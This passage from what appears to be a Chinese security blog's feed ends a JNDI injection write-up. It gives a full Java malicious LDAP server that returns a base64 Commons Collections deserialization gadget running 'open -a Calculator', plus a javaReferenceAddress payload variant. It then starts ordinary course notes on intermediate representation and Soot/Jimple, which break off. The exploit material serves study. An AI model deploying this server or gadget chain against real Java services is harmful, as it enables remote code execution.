src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730892021657-7a6f6724-fe2e-41e9-aa21-a20d951787d5.png"></p><p><font style="color:#000000;">跟进com.sun.jndi.ldap.Obj.java#deserializeObject方法，可以看到此处会进行readObject，因此可以通过修改ldap服务直接返回javaSerializedData参数的数据（序列化gadget数据），达到反序列化RCE。</font></p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730892256862-17813482-346f-452a-95d5-2752f2ab6439.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServerBypass</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argsx)</span> &#123;</span><br><span class="line">        String[] args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8000/#Evil&quot;</span>, <span class="string">&quot;1389&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (args.length &lt; <span class="number">1</span> || args[<span class="number">0</span>].indexOf(<span class="string">&#x27;#&#x27;</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (args.length &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[<span class="number">0</span>])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span><span class="params">(URL cb)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span><span class="params">(InMemoryInterceptedSearchResult result, String base, Entry e)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.getDecoder().decode(<span class="string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABJvcGVuIC1hIENhbGN1bGF0b3J0AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p><font style="color:#000000;">跟进com.sun.jndi.ldap.Obj.java#decodeReference函数中，在普通的Reference还原的基础上，还可以进一步对RefAddress做还原处理，其中还原过程中，也调用了deserializeObject函数，这意味着通过满足RefAddress的方式，也可以达到上面第一种的效果。</font></p><p><font style="color:#000000;">Payload构造需满足以下条件：</font></p><ol><li><font style="color:#000000;">第一个字符为分隔符</font></li><li><font style="color:#000000;">第一个分隔符与第二个分隔符之间，表示Reference的position，为int类型</font></li><li><font style="color:#000000;">第二个分隔符与第三个分隔符之间，表示type类型</font></li><li><font style="color:#000000;">第三个分隔符是双分隔符的形式，则进入反序列化的操作</font></li><li><font style="color:#000000;">序列化数据用base64编码</font></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">e.addAttribute(<span class="string">&quot;javaReferenceAddress&quot;</span>,<span class="string">&quot;$1$String$$&quot;</span>+<span class="keyword">new</span> <span class="title class_">BASE64Encoder</span>().encode(serializeObject(getPayload())));</span><br><span class="line">e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">// $NON-NLS-1$</span></span><br><span class="line">result.sendSearchEntry(e);</span><br><span class="line">result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br></pre></td></tr></table></figure><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730895653253-993e6152-6b5d-4c5f-a8c8-e1b070f37c7c.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://infosecwriteups.com/jndi-injection-the-complete-story-4c5bfbb3f6e1">JNDI Injection — The Complete Story</a></p><p><a href="https://tttang.com/archive/1611/">JNDI注入分析</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JNDI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>南大软分学习笔记-Intermediate Representation</title>
      <link href="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/"/>
      <url>/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/</url>
      
        <content type="html"><![CDATA[<h2 id="Compilers-and-Static-Analyzers"><a href="#Compilers-and-Static-Analyzers" class="headerlink" title="Compilers and Static Analyzers"></a>Compilers and Static Analyzers</h2><p><font style="color:#000000;">编译通常包括</font><strong><font style="color:#000000;">词法分析、语法分析、语义分析</font></strong><font style="color:#000000;">等过程，最终生成机器码。源代码向机器码转化的过程大致如下：</font></p><ol><li><font style="color:#000000;">在词法分析阶段，编译器将源程序分成一个一个的Token，划分出是关键字还是标识符还是运算符等，利用Regular Expression（正则表达式）来实现；</font></li><li><font style="color:#000000;">在语法分析阶段，将一个个的Token组成句子，利用Context-Free Grammar（上下文无关文法，CFG）来实现，构造出AST；</font></li><li><font style="color:#000000;">在语义分析阶段，会进行类型检测等，构造出修饰后的AST；</font></li><li><font style="color:#000000;">在翻译阶段，常将Decorated AST翻译为生成三地址码这样的中间表示形式（Intermediate Representation，IR），并基于IR进行静态分析（例如代码优化等）；</font></li><li><font style="color:#000000;">在机器码生成阶段，将IR转化成物理CPU能够直接执行的比特序列，即机器代码。</font></li></ol><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1729751715002-de576258-83d9-4b60-a2f3-590e9e3de3cf.png"></p><h2 id="AST-vs-IR"><a href="#AST-vs-IR" class="headerlink" title="AST vs IR"></a>AST vs IR</h2><p><font style="color:#000000;">在编译过程中可以看到有两类中间结果：AST和IR，那么为什么静态分析基于IR进行实现而不是选择AST呢？</font></p><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1729753042989-1820126b-ced5-4b27-8aa6-2edf25688172.png"></p><p><font style="color:#000000;">在上图例子中可以看出IR相较于AST有如下优点，因此IR更适合作为静态分析的基础。</font></p><ol><li><font style="color:#000000;">AST是high-level且接近语法结构的，而IR是low-level且接近机器代码的。</font></li><li><font style="color:#000000;">AST是依赖于语言的，IR通常是独立于语言的，三地址码会被分析器重点关注，因为可以将各种前端语言统一翻译成同一种IR再加以优化。</font></li><li><font style="color:#000000;">AST适合快速类型检查，IR的结构更加紧凑和统一，在AST中包含了很多非终结符所占用的结点（body，assign等），而IR中不会需要到这些信息。</font></li><li><font style="color:#000000;">AST缺少控制流信息，IR包含了控制流信息，AST中只是有结点表明了这是一个do-while结构，但是无法看出控制流信息，而IR中的goto等信息可以轻易看出控制流。</font></li></ol><p><font style="color:#000000;">总结而言，AST与IR各有以下特点。</font></p><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1729785010080-919954f9-9e55-4a58-bc99-e676deb43453.png"></p><h2 id="Three-Address-Code"><a href="#Three-Address-Code" class="headerlink" title="Three-Address Code"></a>Three-Address Code</h2><p><font style="color:#000000;">I</font><strong><font style="color:#000000;">R常用的表示形式是三地址码</font></strong><font style="color:#000000;">（3-Address Code，简称3AC），其通常没有统一的格式。</font></p><p><strong><font style="color:#000000;">三地址码要求在一个指令的右边至多只有一个操作符</font></strong><font style="color:#000000;">，例如，对于a + b + 3这样的语句，3AC需要引入临时变量来将其转换为指令t1 &#x3D; a + b和指令t2 &#x3D; t1 + 3。</font></p><p><font style="color:#000000;">所谓三地址码，指的是每个3AC指令可以至多包含三种地址：</font><strong><font style="color:#000000;">变量名</font></strong><font style="color:#000000;">（例如a，b等）、</font><strong><font style="color:#000000;">常量</font></strong><font style="color:#000000;">（例如3，-100等）以及</font><strong><font style="color:#000000;">编译器生成的临时变量</font></strong><font style="color:#000000;">（例如t1，t2等）。</font></p><p><font style="color:#000000;">下面是一些常见的3AC形式：</font></p><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1729785903547-f1cea9e6-6fa8-448d-befc-1b634c6b0daf.png"></p><p><font style="color:#000000;">3AC在真实静态分析中的应用，</font><a href="https://github.com/soot-oss/soot"><font style="color:#000000;">https://github.com/soot-oss/soot</font></a><font style="color:#000000;">。Soot是一种到Java静态分析框架，它的IR叫做Jimple，一种有类型的三地址码（Typed 3AC）。</font></p><p><font style="color:#000000;">Soot下载地址可以参考：</font><a href="https://repo.maven.apache.org/maven2/org/soot-oss/soot/"><font style="color:#000000;">https://repo.maven.apache.org/maven2/org/soot-oss/soot/</font></a><font style="color:#000000;">，以下是几个Jimple的示例。</font></p><ul><li><font style="color:#000000;">Do-While Loop</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DoWhileLoop3AC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (arr[i] &lt; <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 预先生成class文件，然后再执行Soot</span></span><br><span class="line">javac DoWhileLoop3AC.java</span><br><span class="line">java -<span class="built_in">cp</span> soot-4.6.0-jar-with-dependencies.jar:slf4j-nop-2.0.16.jar soot.Main -f J -pp -<span class="built_in">cp</span> . DoWhileLoop3AC</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DoWhileLoop3AC</span> <span class="keyword">extends</span> <span class="title class_">java</span>.lang.Object</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> &lt;init&gt;()</span><br><span class="line">    &#123;</span><br><span class="line">        DoWhileLoop3AC r0;</span><br><span class="line"></span><br><span class="line">        r0 := <span class="meta">@this</span>: DoWhileLoop3AC;</span><br><span class="line"></span><br><span class="line">        specialinvoke r0.&lt;java.lang.Object: <span class="keyword">void</span> &lt;init&gt;()&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(java.lang.String[])</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span>[] r0;</span><br><span class="line">        <span class="type">int</span> $i0, $i1, i2;</span><br><span class="line">        java.lang.String[] r1;</span><br><span class="line"></span><br><span class="line">        r1 := <span class="meta">@parameter0</span>: java.lang.String[];</span><br><span class="line"></span><br><span class="line">        r0 = newarray (<span class="type">int</span>)[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">        i2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        label1:</span><br><span class="line">        $i1 = i2 + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        i2 = $i1;</span><br><span class="line"></span><br><span class="line">        $i0 = r0[$i1];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> $i0 &lt; <span class="number">10</span> <span class="keyword">goto</span> label1;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">Method Call</font><ul><li><font style="color:#000000;">invokespecial：call constructor，call superclass methods，call private methods</font></li><li><font style="color:#000000;">invokevirtual：instance methods call（virtual dispatch，派生）</font></li><li><font style="color:#000000;">invokeInterface：cannot optimization，checking interface implementation</font></li><li><font style="color:#000000;">invokestatic：call static methods</font></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MethodCall3AC</span> &#123;</span><br><span class="line">    String <span class="title function_">foo</span><span class="params">(String para1, String para2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> para1 + <span class="string">&quot; &quot;</span> + para2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MethodCall3AC</span> <span class="variable">mc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodCall3AC</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> mc.foo(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 预先生成class文件，然后再执行Soot</span></span><br><span class="line">javac MethodCall3AC.java</span><br><span class="line">java -<span class="built_in">cp</span> soot-4.6.0-jar-with-dependencies.jar:slf4j-nop-2.0.16.jar soot.Main -f J -pp -<span class="built_in">cp</span> . MethodCall3AC</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MethodCall3AC</span> <span class="keyword">extends</span> <span class="title class_">java</span>.lang.Object</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> &lt;init&gt;()</span><br><span class="line">    &#123;</span><br><span class="line">        MethodCall3AC r0;</span><br><span class="line"></span><br><span class="line">        r0 := <span class="meta">@this</span>: MethodCall3AC;</span><br><span class="line"></span><br><span class="line">        specialinvoke r0.&lt;java.lang.Object: <span class="keyword">void</span> &lt;init&gt;()&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    java.lang.String <span class="title function_">foo</span><span class="params">(java.lang.String, java.lang.String)</span></span><br><span class="line">    &#123;</span><br><span class="line">        MethodCall3AC r3;</span><br><span class="line">        java.lang.String r0, r1, $r2;</span><br><span class="line"></span><br><span class="line">        r3 := <span class="meta">@this</span>: MethodCall3AC;</span><br><span class="line"></span><br><span class="line">        r0 := <span class="meta">@parameter0</span>: java.lang.String;</span><br><span class="line"></span><br><span class="line">        r1 := <span class="meta">@parameter1</span>: java.lang.String;</span><br><span class="line"></span><br><span class="line">        $r2 = dynamicinvoke <span class="string">&quot;makeConcatWithConstants&quot;</span> &lt;java.lang.String (java.lang.String,java.lang.String)&gt;(r0, r1) &lt;java.lang.invoke.StringConcatFactory: java.lang.invoke.CallSite <span class="title function_">makeConcatWithConstants</span><span class="params">(java.lang.invoke.MethodHandles$Lookup,java.lang.String,java.lang.invoke.MethodType,java.lang.String,java.lang.Object[])</span>&gt;(<span class="string">&quot;\u0001 \u0001&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $r2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(java.lang.String[])</span></span><br><span class="line">    &#123;</span><br><span class="line">        java.lang.String[] r1;</span><br><span class="line">        MethodCall3AC $r0;</span><br><span class="line"></span><br><span class="line">        r1 := <span class="meta">@parameter0</span>: java.lang.String[];</span><br><span class="line"></span><br><span class="line">        $r0 = <span class="keyword">new</span> <span class="title class_">MethodCall3AC</span>;</span><br><span class="line"></span><br><span class="line">        specialinvoke $r0.&lt;MethodCall3AC: <span class="keyword">void</span> &lt;init&gt;()&gt;();</span><br><span class="line"></span><br><span class="line">        virtualinvoke $r0.&lt;MethodCall3AC: java.lang.String <span class="title function_">foo</span><span class="params">(java.lang.String,java.lang.String)</span>&gt;(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span 